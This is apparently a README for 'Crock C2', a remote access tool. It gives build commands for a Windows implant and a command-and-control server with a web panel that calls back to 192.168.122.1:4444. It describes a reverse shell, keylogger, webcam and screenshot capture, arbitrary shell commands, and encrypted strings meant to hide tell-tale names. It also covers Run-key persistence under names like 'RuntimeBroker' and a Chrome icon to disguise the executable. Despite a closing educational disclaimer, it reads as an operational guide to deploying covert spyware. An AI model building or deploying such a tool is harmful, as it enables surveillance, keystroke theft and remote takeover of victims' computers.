# Crock C2

Remote access tool with web control panel.
Python implant compiled with Nuitka (--standalone).
Encrypted channel: AES-256-GCM with per-packet nonce.
Key exchange: X25519 ECDH per session.
Web panel: JWT authentication with role-based access control.
String obfuscation: AES-GCM encrypted string literals.
Persistence: HKCU Run key with randomized value name.

## Features

- Reverse shell
- Screenshot
- Webcam photo
- Process list
- Keylogger (start / dump / stop / clear)
- Screen stream (stub)
- Persistence via HKCU Run key (randomized name)
- AES-256-GCM encrypted channel (per-packet nonce)
- X25519 ECDH per-session handshake
- JWT-authenticated web panel with RBAC (viewer / operator / admin)
- AES-GCM string obfuscation for sensitive literals

## Requirements

- Linux (Kali / Ubuntu / Debian) - build + server
- Windows 10/11 - target
- Python 3.10+
- Nuitka

## Install dependencies

sudo apt update
sudo apt install -y python3 python3-pip python3-venv
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

## Files

- implant.py       - implant source
- server.py        - C2 listener + web server
- dashboard.html   - web panel (must be next to server.py)
- auth.py          - JWT authentication with RBAC
- crypto_layer.py  - AES-256-GCM channel + X25519 handshake
- strings_crypt.py - AES-GCM string obfuscation helpers
- requirements.txt - Python dependencies
- chrome.ico       - icon for the build (optional)

## Prepare encrypted strings

Run once on the build host:

python3 - <<'PY'
from strings_crypt import enc
for s in [
    "schtasks",
    "pynput.keyboard",
    "socket",
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "RuntimeBroker",
]:
    print(s, "->", enc(s))
PY

Paste the resulting tokens into implant.py:

_T_SCHTASKS  = "<token for schtasks>"
_T_PYNPUT    = "<token for pynput.keyboard>"
_T_SOCKET    = "<token for socket>"
_T_RUNKEY    = "<token for Software\\Microsoft\\Windows\\CurrentVersion\\Run>"
_T_RUNNAME   = "<token for RuntimeBroker>"

Replace the value of _T_RUNNAME with a freshly generated random name if
you want a unique persistence entry per build.

## Build implant

Edit HOST in implant.py if needed (default 192.168.122.1).

sudo apt install -y g++-mingw-w64-x86-64
source venv/bin/activate
nuitka \
  --standalone \
  --mingw64 \
  --windows-company-name="Crock" \
  --windows-product-name="Crock" \
  --windows-file-description="Crock" \
  --windows-icon-from-ico=chrome.ico \
  --enable-plugin=anti-bloat \
  --assume-yes-for-downloads \
  implant.py

Output: implant.dist/ with implant.exe and dependencies.
Run: implant.dist/implant.exe on the target.

## Run server

export CROCK_ADMIN_PW=strong-password
export CROCK_OP1_PW=another-strong-password
export CROCK_VIEWER_PW=viewer-password
source venv/bin/activate
python3 server.py

- Listener: 0.0.0.0:4444
- Web UI:   http://127.0.0.1:5000

## Authentication

- Web panel requires JWT login.
- JWT secret is generated on first run and stored in .jwt_secret with mode 0600.
- Token TTL: 3600 seconds.
- Roles:
  - viewer   - read client list
  - operator - send commands to clients
  - admin    - manage operators

Default operators (override with environment variables):

- admin   / $CROCK_ADMIN_PW    / admin
- op1     / $CROCK_OP1_PW      / operator
- viewer  / $CROCK_VIEWER_PW   / viewer

## Encryption

- Transport payload: AES-256-GCM (nonce 12 bytes, tag 16 bytes) per packet.
- Frame format: 4-byte big-endian length prefix + nonce + ciphertext + tag.
- Key exchange: X25519 ECDH on connect, session key derived via HKDF-SHA256.
- No static shared key: each connection uses its own session key.

## String obfuscation

- Sensitive literals are AES-GCM encrypted at build time via strings_crypt.enc.
- At runtime, strings_crypt.dec restores them only when needed.
- Master key is embedded in strings_crypt.py.
- Rotate the master key by editing _MASTER and regenerating all tokens.

## Persistence

- Uses HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
- Value name is a randomized 12-character string (generated per build).
- No schtasks dependency.

## Usage

1. Start server.py.
2. Deploy implant.dist/ to the Windows machine and run implant.exe.
3. Open http://127.0.0.1:5000 and log in.
4. Select the client and use the panel.

## Commands

| Command       | Action                        |
|---------------|-------------------------------|
| info          | Client information            |
| screenshot    | Take screenshot               |
| webcam        | Webcam photo                  |
| proclist      | List processes                |
| keylog_start  | Start keylogger               |
| keylog_dump   | Dump keylogger buffer         |
| keylog_stop   | Stop keylogger                |
| keylog_clear  | Clear keylogger buffer        |
| stream_start  | Start screen stream (stub)    |
| stream_stop   | Stop screen stream (stub)     |
| persist       | Add HKCU Run entry            |
| sh:<command>  | Execute shell command         |

## Notes

- Web UI listens only on localhost.
- Default C2 address is 192.168.122.1:4444.
- Persistence uses HKCU Run key with randomized value name.
- .jwt_secret is created automatically and must not be committed.
- Recommended .gitignore entries:
  .jwt_secret
  venv/
  __pycache__/
  *.exe
  implant.build/
  implant.dist/
  implant.onefile-build/
- Lab / authorized use only.

## Disclaimer

For educational and research purposes only.
